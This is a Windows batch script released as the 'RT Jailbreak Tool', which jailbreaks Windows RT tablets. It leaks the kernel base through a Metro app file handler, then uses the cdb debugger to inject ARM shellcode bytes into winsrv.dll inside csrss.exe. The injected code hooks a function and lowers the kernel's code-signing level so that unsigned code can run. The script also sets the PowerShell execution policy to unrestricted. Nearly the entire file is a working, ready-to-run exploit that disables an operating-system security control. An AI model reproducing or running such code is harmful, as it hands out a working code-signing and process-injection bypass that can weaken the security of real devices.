@echo off
rem This is hereby released public domain, on the terms that you do not claim the script or parts of the script as your own.
rem Released 01/10/2013, Version 1
rem Copyright Netham45
rem Thanks to clrokr for finding and documenting the exploit!
title RT Jailbreak Tool release 1 by Netham45
:top
rem Running as administrator mucks with the current dir, this restores it.
cd /d "%~dp0"

rem Check if we have our binaries
if NOT EXIST bin\cdb.exe goto needBin
if NOT EXIST bin\isUnsigned.exe goto needBin

path=%PATH%;%cd%\bin

rem Check if we're already unsigned. If so, throw an error.
echo Checking if we're already running unsigned code...
isUnsigned 2>NUL
if NOT %ERRORLEVEL% == 9020 goto wereUnsigned
cls

rem Cheap dirty way to check if we're admin or not on a stock system
echo a > %systemroot%\system32\rthack_temp
if NOT EXIST %systemroot%\system32\rthack_temp goto notAdmin
del %systemroot%\system32\rthack_temp

rem The rthack metro app has a file handler, .rthack. If it's called with a file that has the ALL APPLICATION PACKAGES group set to write it stores the base address in there.
echo error> %temp%\temp.rthack
icacls %temp%\temp.rthack /grant *S-1-15-2-1:RW
cls
echo Getting kernel base
%temp%\temp.rthack
rem Keep the annoying window from popping up if the Metro app isn't installed.
taskkill /im "openwith.exe" /f
cls
rem Cheap way of waiting 2 seocnds for the hack to go. Make a silent Choice and wait 2 seconds before defaulting to 'Yes'.
choice /d y /t 2 /n
cls
rem Get the contents of temp.rthack into the variable signingLevel.
for /f "delims=" %%a in (%temp%\temp.rthack) do (set signinglevel=%%a)
del %temp%\temp.rthack

if "%signinglevel%" == "error" goto signingLevelError

rem Generate script 1, this injects the payload and hooks the function
echo e winsrv.dll+0x3644 0d f0 dc b8 > %temp%\script1
echo e winsrv.dll+0x10800 2D E9 E0 01 4E F6 F0 77 C0 F2 07 07 DF F8 30 80 0C 23 1A AA 02 F1 04 05 C5 F8 00 80 09 21 6F F0 01 00 41 F2 E1 0C 01 DF 7F 1E 00 2F F0 D1 BD E8 E0 01 07 46 00 2F FD E7 F2 F7 06 BF 00 00 00 00 %signingLevel%>> %temp%\script1
echo .detach >> %temp%\script1
echo q >> %temp%\script1

rem Generate script 2, this clears the hook and allows the payload to jump back to the function
echo e winsrv.dll+0x3644 07 46 00 2f > %temp%\script2
echo e winsrv.dll+0x10836 00 00 >> %temp%\script2
echo .detach >> %temp%\script2
echo q >> %temp%\script2

rem Get the pid for the CSRSS.exe process running under session 1
for /F "tokens=2" %%b in ('tasklist /FI "IMAGENAME eq csrss.exe" /FI "SESSION eq 1" /NH') do set PID=%%b

rem Inject payload and hook
cdb -pvr -p %PID% -cf %temp%\script1
cls
echo Please press VOLUME DOWN now.

rem This loop goes until unsigned code is running
:stillSigned
isUnsigned 2>NUL
if %ERRORLEVEL% == 9020 goto stillSigned

rem Clear the hook and jump back to CSRSS's code
cdb -pvr -p %PID% -cf %temp%\script2

rem Clean up.
del %temp%\script1
del %temp%\script2

cls
echo Your tablet should now be jailbroken.
exit

:notAdmin
cls
rem This requests admin privs. Powershell is slow to load, I don't know why.
echo Please wait, requesting administrative privileges...
%systemroot%\system32\WindowsPowerShell\v1.0\powershell.exe -Command "Start-Process \"%~0\" -Verb RunAs"
exit

:wereUnsigned
cls
echo There is no need to jailbreak again until next reboot.
pause
exit

:needBin
cls
echo I need my bin folder!
pause
exit

:signingLevelError
cls
echo Metro app failed to run. Trying to (re)install the metro app...
start /w powershell -command "set-executionpolicy unrestricted;bin\ModernUI_App\Add-AppDevPackage.ps1"
goto top
exit